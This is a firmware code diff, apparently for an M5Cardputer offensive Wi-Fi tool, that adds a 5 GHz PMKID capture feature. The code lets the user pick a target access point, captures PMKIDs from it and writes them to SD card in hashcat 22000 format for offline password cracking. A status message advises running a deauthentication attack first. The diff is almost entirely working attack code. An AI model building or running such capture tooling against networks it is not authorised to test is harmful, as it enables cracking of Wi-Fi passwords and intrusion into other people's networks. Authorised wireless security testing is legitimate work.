@@ -9,7 +9,9 @@
 #include "radio.h"
 #include "c5_cmd.h"
 #include "ble_db.h"
+#include "sd_helper.h"
 #include <WiFi.h>
+#include <SD.h>
 
 static void draw_status_header(void)
 {
@@ -372,4 +374,154 @@ void feat_c5_scan_zb(void)
         if (k == PK_ESC) break;
     }
     c5_cmd_stop();
+}
+
+/* ==================== C5 5 GHz PMKID capture ==================== */
+
+static void save_pmkid_to_sd(const c5_pmkid_t &p)
+{
+    if (!sd_mount()) return;
+    SD.mkdir("/poseidon");
+    File f = SD.open("/poseidon/hashcat.22000", FILE_APPEND);
+    if (!f) return;
+    /* hashcat 22000 WPA*01* format:
+     *   WPA*01*<pmkid>*<bssid>*<sta>*<essid_hex>***  */
+    f.print("WPA*01*");
+    for (int i = 0; i < 16; ++i) f.printf("%02x", p.pmkid[i]);
+    f.print("*");
+    for (int i = 0; i < 6;  ++i) f.printf("%02x", p.bssid[i]);
+    f.print("*");
+    for (int i = 0; i < 6;  ++i) f.printf("%02x", p.sta[i]);
+    f.print("*");
+    if (p.ssid_len > 0) {
+        for (int i = 0; i < p.ssid_len && i < 33; ++i) f.printf("%02x", (uint8_t)p.ssid[i]);
+    }
+    f.println("***");
+    f.close();
+    Serial.printf("[c5_pmkid] logged PMKID %02x%02x%02x%02x... sta %02X:%02X:%02X\n",
+                  p.pmkid[0], p.pmkid[1], p.pmkid[2], p.pmkid[3],
+                  p.sta[3], p.sta[4], p.sta[5]);
+}
+
+void feat_c5_pmkid_5g(void)
+{
+    radio_switch(RADIO_WIFI);
+    c5_begin();
+    if (!c5_any_online()) { ui_toast("no C5 online", T_BAD, 1500); return; }
+
+    /* Prefer existing 5G scan results; else trigger a short one. */
+    c5_ap_t aps[64];
+    int n = c5_aps(aps, 64);
+    if (n == 0) {
+        c5_clear_results();
+        c5_cmd_scan_5g(400);
+        ui_toast("scanning first...", T_ACCENT, 1200);
+        delay(1500);
+        n = c5_aps(aps, 64);
+    }
+    int five_n = 0;
+    for (int i = 0; i < n; ++i) if (aps[i].is_5g) aps[five_n++] = aps[i];
+    n = five_n;
+    if (n == 0) { ui_toast("no 5 GHz APs found", T_WARN, 1500); return; }
+
+    /* Target picker. */
+    auto &d = M5Cardputer.Display;
+    int cursor = 0;
+    ui_draw_footer(";/. pick  ENTER=capture  `=back");
+    int chosen = -1;
+    while (chosen < 0) {
+        ui_clear_body();
+        d.setTextColor(T_ACCENT2, T_BG);
+        d.setCursor(4, BODY_Y + 2); d.print("PMKID 5 GHz — PICK TARGET");
+        d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, T_ACCENT2);
+        int rows = 7;
+        if (cursor < 0) cursor = 0;
+        if (cursor >= n) cursor = n - 1;
+        int first = cursor - rows / 2;
+        if (first < 0) first = 0;
+        if (first + rows > n) first = (n > rows) ? (n - rows) : 0;
+        for (int r = 0; r < rows && first + r < n; ++r) {
+            int i = first + r;
+            const c5_ap_t &a = aps[i];
+            int y = BODY_Y + 18 + r * 12;
+            bool sel = (i == cursor);
+            if (sel) d.fillRect(0, y - 1, SCR_W, 12, 0x3007);
+            d.setTextColor(sel ? T_ACCENT : T_FG, sel ? 0x3007 : T_BG);
+            d.setCursor(2, y);
+            d.printf("%4d ch%-3u %.20s", a.rssi, a.channel,
+                     a.ssid[0] ? a.ssid : "<hidden>");
+        }
+        uint16_t k = input_poll();
+        if (k == PK_NONE) { delay(30); continue; }
+        if (k == PK_ESC) return;
+        if (k == ';' || k == PK_UP)   { if (cursor > 0) cursor--; }
+        if (k == '.' || k == PK_DOWN) { cursor++; }
+        if (k == PK_ENTER) { chosen = cursor; break; }
+    }
+
+    /* Fire capture + live dashboard. */
+    c5_clear_results();
+    uint16_t dur = 15000;
+    c5_cmd_pmkid(aps[chosen].bssid, aps[chosen].channel, dur);
+
+    uint32_t end = millis() + dur + 2000;
+    uint32_t last = 0;
+    int last_count = -1;
+    int written = 0;
+    ui_clear_body();
+    ui_draw_footer("`=stop early");
+    while (millis() < end) {
+        if (millis() - last > 250) {
+            last = millis();
+            c5_pmkid_t buf[16];
+            int got = c5_pmkids(buf, 16);
+            bool tick = (got != last_count);
+            last_count = got;
+
+            /* Flush new captures to SD. */
+            while (written < got) {
+                save_pmkid_to_sd(buf[written]);
+                written++;
+            }
+
+            ui_clear_body();
+            ui_dashboard_chrome("C5 PMKID 5G", tick);
+            draw_status_header();
+            d.setTextColor(T_FG, T_BG);
+            d.setCursor(4, BODY_Y + 18);
+            d.printf("%.22s", aps[chosen].ssid[0] ? aps[chosen].ssid : "<hidden>");
+            d.setTextColor(T_DIM, T_BG);
+            d.setCursor(4, BODY_Y + 30);
+            d.printf("ch%u  %02X:%02X:%02X:%02X:%02X:%02X",
+                     aps[chosen].channel,
+                     aps[chosen].bssid[0], aps[chosen].bssid[1],
+                     aps[chosen].bssid[2], aps[chosen].bssid[3],
+                     aps[chosen].bssid[4], aps[chosen].bssid[5]);
+            uint16_t col = got > 0 ? T_GOOD : T_ACCENT;
+            d.setTextColor(col, T_BG);
+            d.setCursor(4, BODY_Y + 46);
+            d.printf("PMKIDs  : %d", got);
+            d.setTextColor(T_DIM, T_BG);
+            d.setCursor(4, BODY_Y + 58);
+            uint32_t left = (end > millis()) ? (end - millis()) / 1000 : 0;
+            d.printf("time    : %lus  -> hashcat.22000", (unsigned long)left);
+            ui_freq_bars(SCR_W - 70, BODY_Y + 16, 4, 36);
+            ui_draw_status(radio_name(), "C5-PMKID");
+        }
+        uint16_t k = input_poll();
+        if (k == PK_NONE) { delay(20); continue; }
+        if (k == PK_ESC) { c5_cmd_stop(); break; }
+    }
+
+    /* Final flush + summary. */
+    c5_pmkid_t buf[16];
+    int got = c5_pmkids(buf, 16);
+    while (written < got) { save_pmkid_to_sd(buf[written]); written++; }
+    if (written > 0) {
+        char msg[40];
+        snprintf(msg, sizeof(msg), "captured %d -> SD", written);
+        ui_toast(msg, T_GOOD, 1200);
+    } else {
+        ui_toast("no PMKID (try deauth first)", T_WARN, 1500);
+    }
 }
